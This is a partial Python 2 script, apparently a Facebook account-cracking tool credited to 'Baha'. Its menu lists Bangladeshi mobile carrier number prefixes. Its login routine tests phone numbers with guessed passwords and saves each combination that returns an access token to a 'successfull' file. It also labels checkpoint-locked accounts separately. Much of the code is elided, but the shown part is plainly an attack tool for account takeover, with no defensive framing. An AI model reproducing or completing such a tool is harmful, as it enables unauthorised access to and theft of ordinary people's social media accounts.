...
def menu():
    ...
    print '\x1b[1;91mAUTHOR  : Baha '
    print '\x1b[1;91mFACEBOOK : BAHA UDDIN'
    ...
    print
    print '\x1b[1;92m[1]  ROBI (BAHA)'
    print '\x1b[1;92m[2]  AIRTEL(Baha)'
    print '\x1b[1;92m[3]  BANGLALINK(OLD)'
    print '\x1b[1;92m[4]  BANGLALINK(NEW)'
    print '\x1b[1;92m[5]  GRAMEEN(BAHA)'
    print '\x1b[1;92m[6]  TELETALK(BAHA)'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[Baha-HACK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[Baha-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Login 12 Days]\x1b[0m \n'
